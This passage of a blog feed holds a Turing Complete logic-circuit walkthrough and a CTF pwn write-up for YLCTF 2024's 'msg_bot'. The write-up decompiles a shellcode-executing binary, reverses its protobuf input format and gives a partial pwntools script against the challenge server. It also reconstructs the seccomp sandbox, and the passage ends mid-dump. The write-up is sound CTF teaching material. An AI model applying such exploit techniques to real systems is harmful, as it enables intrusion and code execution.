    <content type="html"><![CDATA[<h2 id="二进制速算"><a href="#二进制速算" class="headerlink" title="二进制速算"></a>二进制速算</h2><p>口算题，不涉及电路，好好熟悉一下2的次方数再去做会比较快。</p><h2 id="成对的麻烦"><a href="#成对的麻烦" class="headerlink" title="成对的麻烦"></a>成对的麻烦</h2><p>有两个及以上数量的真才为真，一共有四个输入。思路很简单，我只要保证每两个输入至少会接在同一个与门上即可，四个输入组合起来一共有六个可能，也就是会有六个与门，这些与门再由或门连接即可。</p><p><img src="https://c-lby.top/images/Turing-Complete/2/%E6%88%90%E5%AF%B9%E7%9A%84%E9%BA%BB%E7%83%A6.png" alt="成对的麻烦"></p><h2 id="奇数个信号"><a href="#奇数个信号" class="headerlink" title="奇数个信号"></a>奇数个信号</h2><p>奇数个真才为真，并且限制只能用三个元件。我在上高中的时候从数学老师那里学到印象最深的一个道理是，<strong>正难则反</strong>。这道题换个视角来看就是，偶数个真就是假。诶！异或门不就刚好是这个性质吗？所以这道题只需要两两输入接入一个异或门，再由一个异或门连接即可。</p><p><img src="https://c-lby.top/images/Turing-Complete/2/%E5%A5%87%E6%95%B0%E4%B8%AA%E4%BF%A1%E5%8F%B7.png" alt="奇数个信号"></p><h2 id="信号计数"><a href="#信号计数" class="headerlink" title="信号计数"></a>信号计数</h2><p>根据输入为真的数量输出二进制（3bits）。</p><p>关于1的思路很简单，因为只有当数字是奇数的时候才会为真。观察真值表可以发现，当奇数个真的时候，输出一定是奇数，所以接入输出一的电路和“奇数个信号”电路是一样的。</p><p>关于2我们也能找到一些规律，当至多只有一个真的时候，数字不会大于1，所以2肯定不会启用，也就是说当输入为真数量大于等于2的时候输出真，那么电路就和“成对的麻烦”一样了。但是问题是当输入全部为真的时候，2并不会启用，只有4启用。这个问题很好解决，给输出二接一个异或门就行，用与门判断如果全部都为真，将这个结果与上述电路接入异或门给到输出二即可。</p><p>其实这道题没有这么难，主要看你能不能关联到前面做的电路。</p><p><img src="https://c-lby.top/images/Turing-Complete/2/%E4%BF%A1%E5%8F%B7%E8%AE%A1%E6%95%B0.png" alt="信号计数"></p><h2 id="加倍"><a href="#加倍" class="headerlink" title="加倍"></a>加倍</h2><p>新的元件。非常简单，每一个都乘二后输出，其实也就是左移了一位。</p><p><img src="https://c-lby.top/images/Turing-Complete/2/%E5%8A%A0%E5%80%8D.png" alt="加倍"></p><h2 id="8位非"><a href="#8位非" class="headerlink" title="8位非"></a>8位非</h2><p>8位数分别取反即可</p><p><img src="https://c-lby.top/images/Turing-Complete/2/8%E4%BD%8D%E9%9D%9E.png" alt="8位非"></p><h2 id="8位或"><a href="#8位或" class="headerlink" title="8位或"></a>8位或</h2><p>8位数分别取或即可</p><p><img src="https://c-lby.top/images/Turing-Complete/2/8%E4%BD%8D%E6%88%96.png" alt="8位或"></p><h2 id="半加器"><a href="#半加器" class="headerlink" title="半加器"></a>半加器</h2><p>加法，但是两个单字节相加，输出也只有一个字节，没法完全储存所有可能的结果（因为可能进位溢出），但是也预留了进位寄存器一个字节。这道题可以根据真值表来做，sum位其实就是异或门的真值表，car位就是与门的真值表。</p><h2 id="全加器"><a href="#全加器" class="headerlink" title="全加器"></a>全加器</h2><p>思路和半加器稍微有点不同，没法直接通过真值表来做，可以从算术的角度去考虑。只有三个输入的情况下，输出只有0,1,2,3。只有2和3的时候才会产生进位，所以利用“成对的麻烦”相同的思路去判断输入为真的数量有没有超过2个即可。而sum位则可以使用“奇数个信号”电路的思路来编写。</p><p><img src="https://c-lby.top/images/Turing-Complete/2/%E5%85%A8%E5%8A%A0%E5%99%A8.png" alt="全加器"></p><h2 id="8位加法器"><a href="#8位加法器" class="headerlink" title="8位加法器"></a>8位加法器</h2><p>这时候已经有add元件可以用了，那就很简单了，对应位分别相加即可，别忘了在计算高一位的时候要考虑上低一位的进位问题。</p><p><img src="https://c-lby.top/images/Turing-Complete/2/8%E4%BD%8D%E5%8A%A0%E6%B3%95%E5%99%A8.png" alt="8位加法器"></p><p>（彩虹！（神金））</p><h2 id="负数"><a href="#负数" class="headerlink" title="负数"></a>负数</h2><p>先学好补码的知识，再来做口算题。</p><p><img src="https://c-lby.top/images/Turing-Complete/2/%E8%A1%A5%E7%A0%81.png" alt="补码"></p><h2 id="相反数"><a href="#相反数" class="headerlink" title="相反数"></a>相反数</h2><p>前面已经学过了补码和负数的知识了，那么其实就很容易想到某个数的相反数其实就是那个数取反后+1。如果这关想不懂，说明补码没学懂。</p><p><img src="https://c-lby.top/images/Turing-Complete/2/%E7%9B%B8%E5%8F%8D%E6%95%B0.png" alt="相反数"></p><h2 id="1位解码器"><a href="#1位解码器" class="headerlink" title="1位解码器"></a>1位解码器</h2><p>一个神奇的元件，由一个元件控制到不同输出。因为有了开关元件，所以这题不是很难，当一路控制为开路的时候另一路控制为闭路即可，一个输入分为两条路，其中一条路要加上非门，这样来保证一条开路一条闭路。</p><p><img src="https://c-lby.top/images/Turing-Complete/2/1%E4%BD%8D%E8%A7%A3%E7%A0%81%E5%99%A8.png" alt="1位解码器"></p><h2 id="3位解码器"><a href="#3位解码器" class="headerlink" title="3位解码器"></a>3位解码器</h2><p>3位输入排列后可以得到8种可能，这时候用开关就不好用了。我选择用排列组合的方式，用与门，将八种情况全部列出来。对于一位输入，分两条路之后，无非就是1和0的区别。根据真值表来选择节点。</p><p><img src="https://c-lby.top/images/Turing-Complete/2/3%E4%BD%8D%E8%A7%A3%E7%A0%81%E5%99%A8.png" alt="3位解码器"></p><h2 id="逻辑引擎"><a href="#逻辑引擎" class="headerlink" title="逻辑引擎"></a>逻辑引擎</h2><p>这个好像没什么好讲的。指令操作码解码的时候，因为只有4个指令，所以只用到四路输出，剩下的不管。另外要注意的是，要用开关控制住其他的运算结果不要和要输出的冲突输出了。</p><p><img src="https://c-lby.top/images/Turing-Complete/2/%E9%80%BB%E8%BE%91%E5%BC%95%E6%93%8E.png" alt="逻辑引擎"></p>]]></content>
    
    
    <summary type="html">第一章写文字讲述理解写得我好累，这一章开始，想到什么讲什么，想不到就只有图了。顺带一提，本攻略没有那么追求极致的效率和布局，大佬轻喷。</summary>
    
    
    
    <category term="图灵完备" scheme="https://c-lby.top/categories/%E5%9B%BE%E7%81%B5%E5%AE%8C%E5%A4%87/"/>
    
    
    <category term="图灵完备" scheme="https://c-lby.top/tags/%E5%9B%BE%E7%81%B5%E5%AE%8C%E5%A4%87/"/>
    
    <category term="计组" scheme="https://c-lby.top/tags/%E8%AE%A1%E7%BB%84/"/>
    
  </entry>
  
  <entry>
    <title>『YLCTF 源鲁杯 2024』 msg_bot</title>
    <link href="https://c-lby.top/2024/YLCTF-msgbot-protobuf/"/>
    <id>https://c-lby.top/2024/YLCTF-msgbot-protobuf/</id>
    <published>2024-10-12T11:32:45.000Z</published>
    <updated>2024-10-23T15:26:48.372Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *__fastcall <span class="title function_">sub_1389</span><span class="params">(<span class="type">double</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v1 = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(v1);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  isnan(a1);</span><br><span class="line">  v2 = rand();</span><br><span class="line">  result = mmap((<span class="type">void</span> *)(v2 % <span class="number">0x7FFFFFFF</span>), <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  dest = result;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>申请了一块mmap地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_164B</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-118h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">264</span>]; <span class="comment">// [rsp+10h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;botmsg: &quot;</span>);</span><br><span class="line">  v1 = read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  qword_4058 = sub_199E(<span class="number">0LL</span>, v1, buf);</span><br><span class="line">  <span class="keyword">if</span> ( !qword_4058 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;format error.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(_QWORD *)(qword_4058 + <span class="number">24</span>) == <span class="number">3735928559LL</span> &amp;&amp; *(_QWORD *)(qword_4058 + <span class="number">32</span>) == <span class="number">195939070LL</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;format checked.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( *(_QWORD *)(qword_4058 + <span class="number">24</span>) == <span class="number">3235839725LL</span> &amp;&amp; *(_QWORD *)(qword_4058 + <span class="number">32</span>) == <span class="number">4027448014LL</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_15B2(*(_QWORD *)(qword_4058 + <span class="number">48</span>), (<span class="type">unsigned</span> <span class="type">int</span>)*(_QWORD *)(qword_4058 + <span class="number">40</span>));</span><br><span class="line">    sub_1461();</span><br><span class="line">    <span class="keyword">if</span> ( *(_QWORD *)(qword_4058 + <span class="number">40</span>) &lt;= <span class="number">0xC7</span>uLL &amp;&amp; v1 &lt;= <span class="number">0xC7</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memcpy</span>(dest, *(<span class="type">const</span> <span class="type">void</span> **)(qword_4058 + <span class="number">48</span>), *(_QWORD *)(qword_4058 + <span class="number">40</span>));</span><br><span class="line">      ((<span class="type">void</span> (*)(<span class="type">void</span>))dest)();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;nothing.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sub_199E就是解包函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_15B2</span><span class="params">(__int64 a1, <span class="type">unsigned</span> <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = a2;</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)(a2 - <span class="number">1</span> + a1) == <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_BYTE *)(a2 - <span class="number">1</span> + a1) = <span class="number">0</span>;</span><br><span class="line">    v3 = a2 - <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &lt;= i )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *(<span class="type">char</span> *)((<span class="type">int</span>)i + a1) &lt;= <span class="number">31</span> || *(_BYTE *)((<span class="type">int</span>)i + a1) == <span class="number">127</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Oops!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以给传入shellcode，但是要求在可见字符范围内。并且开了沙盒</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_1461</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">  v43 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = <span class="number">32</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">53</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">1</span>;</span><br><span class="line">  v10 = <span class="number">0x40000000</span>;</span><br><span class="line">  v11 = <span class="number">21</span>;</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  v13 = <span class="number">6</span>;</span><br><span class="line">  v14 = <span class="number">-1</span>;</span><br><span class="line">  v15 = <span class="number">21</span>;</span><br><span class="line">  v16 = <span class="number">5</span>;</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  v18 = <span class="number">0</span>;</span><br><span class="line">  v19 = <span class="number">21</span>;</span><br><span class="line">  v20 = <span class="number">4</span>;</span><br><span class="line">  v21 = <span class="number">0</span>;</span><br><span class="line">  v22 = <span class="number">1</span>;</span><br><span class="line">  v23 = <span class="number">21</span>;</span><br><span class="line">  v24 = <span class="number">3</span>;</span><br><span class="line">  v25 = <span class="number">0</span>;</span><br><span class="line">  v26 = <span class="number">5</span>;</span><br><span class="line">  v27 = <span class="number">21</span>;</span><br><span class="line">  v28 = <span class="number">2</span>;</span><br><span class="line">  v29 = <span class="number">0</span>;</span><br><span class="line">  v30 = <span class="number">37</span>;</span><br><span class="line">  v31 = <span class="number">21</span>;</span><br><span class="line">  v32 = <span class="number">1</span>;</span><br><span class="line">  v33 = <span class="number">0</span>;</span><br><span class="line">  v34 = <span class="number">231</span>;</span><br><span class="line">  v35 = <span class="number">6</span>;</span><br><span class="line">  v36 = <span class="number">0</span>;</span><br><span class="line">  v37 = <span class="number">0</span>;</span><br><span class="line">  v38 = <span class="number">0</span>;</span><br><span class="line">  v39 = <span class="number">6</span>;</span><br><span class="line">  v40 = <span class="number">0</span>;</span><br><span class="line">  v41 = <span class="number">0</span>;</span><br><span class="line">  v42 = <span class="number">2147418112</span>;</span><br><span class="line">  v1 = <span class="number">10</span>;</span><br><span class="line">  v2 = &amp;v3;</span><br><span class="line">  prctl(<span class="number">38</span>, <span class="number">1LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  prctl(<span class="number">22</span>, <span class="number">2LL</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">return</span> v43 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后执行shellcode。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="protobuf"><a href="#protobuf" class="headerlink" title="protobuf"></a>protobuf</h3><p>首先是程序要求以protobuf格式进行输入。protobuf环境安装看我的<a href="https://c-lby.top/2024/10/11/protobuf-install/">这篇文章</a>。接下来先逆向proto数据格式。不清楚怎么逆向的，可以先看Real返璞归真师傅的<a href="https://mp.weixin.qq.com/s/lipd1tc9RGW3VW_WEpjQxA">文章</a>.</p><p>我们打开IDA-view视图，按ctrl+s，找到.data.rel.ro段。<img src="https://c-lby.top/images/2024YLCTF-1/proto%E5%AD%97%E6%AE%B5.png" alt="proto字段"></p><p>在0x3C68偏移处可以看到proto名字叫msgbot，package名字是bot，一共3个字段。根据0x3C98处的指针跟进到字段表。</p><p><img src="https://c-lby.top/images/2024YLCTF-1/bot%E5%AD%97%E6%AE%B5%E8%A1%A8.png" alt="bot字段表"></p><p>第一个字段是msgid，1是字段的id，3说明字段的label是none(同时说明syntax是3)，第二个3说明字段的类型是int64，0x18说明这个字段在proto里面的偏移是0x18。以此类推。0xF的类型是bytes。于是就可得到bot.proto:</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">syntax=<span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> bot;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">msgbot</span> &#123;</span><br><span class="line">    <span class="type">int64</span> msgid=<span class="number">1</span>;</span><br><span class="line">    <span class="type">int64</span> msgsize=<span class="number">2</span>;</span><br><span class="line">    <span class="type">bytes</span> msgcontent=<span class="number">3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用<code>protoc --python_out=. bot.proto</code>生成python文件用来写脚本。</p><p>根据主逻辑里给出来的条件判断，写出前置脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> bot_pb2 <span class="keyword">as</span> pb <span class="comment">#protobuf生成的文件</span></span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64 <span class="comment">#用来生成可见字符shellcode的工具</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># e = ELF(&#x27;./msg_bot&#x27;)</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process(&#x27;./msg_bot&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&quot;challenge.yuanloo.com&quot;</span>, <span class="number">41741</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;botmsg&#x27;</span>)</span><br><span class="line"></span><br><span class="line">msg = pb.msgbot()</span><br><span class="line">msg.msgid = <span class="number">0xC0DEFEED</span></span><br><span class="line">msg.msgsize = <span class="number">0xF00DFACE</span></span><br><span class="line">msg.msgcontent = <span class="string">b&#x27;?&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(msg.SerializeToString()))</span><br></pre></td></tr></table></figure><h3 id="沙盒"><a href="#沙盒" class="headerlink" title="沙盒"></a>沙盒</h3><p>当传输的数据满足一定条件时，就能进到执行shellcode的路径，但是同时这条路上程序也开了个沙盒。这道题比较恶心的点是，沙盒是在分支里才开启的，需要输入特定的数据，用seccomp-tools没法直接dump出来，因为在终端没法直接输入不可见字节。也许用脚本或者其他方式能够dump出来，但是我不会，所以用了个比较蠢但是一定对的方法来看沙盒规则：根据伪代码自己写一个程序。其实如果对prctl熟悉的话，也许可以直接从伪代码看出来规则，但是我不熟悉，在网上查了很久才看懂prctl的用法，这里不展开。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/audit.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">install_filter</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] =</span> &#123;</span><br><span class="line">        BPF_STMT(BPF_LD + BPF_W + BPF_ABS, (offsetof(<span class="keyword">struct</span> seccomp_data, nr))),</span><br><span class="line">        &#123;<span class="number">0x35</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0x40000000</span>&#125;,</span><br><span class="line">        &#123;<span class="number">21</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0xFFFFFFFF</span>&#125;,</span><br><span class="line">        &#123;<span class="number">21</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">0</span>&#125;,</span><br><span class="line">        &#123;<span class="number">21</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="number">21</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">5</span>&#125;,</span><br><span class="line">        &#123;<span class="number">21</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0x25</span>&#125;,</span><br><span class="line">        &#123;<span class="number">21</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0xe7</span>&#125;,</span><br><span class="line">        BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),</span><br><span class="line">        BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),</span><br><span class="line">        <span class="comment">// BPF_JUMP(21, 59, 2, 1),</span></span><br><span class="line">        <span class="comment">// BPF_JUMP(21, 11, 1, 0),</span></span><br><span class="line">        <span class="comment">// BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),</span></span><br><span class="line">        <span class="comment">// BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span> =</span> &#123;</span><br><span class="line">        .len = (<span class="type">unsigned</span> <span class="type">short</span>)(<span class="keyword">sizeof</span>(filter) / <span class="keyword">sizeof</span>(filter[<span class="number">0</span>])),</span><br><span class="line">        .filter = filter,</span><br><span class="line">    &#125;;</span><br><span class="line">    prctl(PR_SET_NO_NEW_PRIVS, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    prctl(PR_SET_SECCOMP, <span class="number">2</span>, &amp;prog);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hey there!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    install_filter();</span><br><span class="line"></span><br><span class="line">    execve(<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译之后再用seccomp-tools导出沙盒规则，就好看了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">seccomp-tools dump ./tmp</span></span><br><span class="line">hey there!</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0003</span><br><span class="line"> 0002: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0009</span><br><span class="line"> 0003: 0x15 0x05 0x00 0x00000000  if (A == read) goto 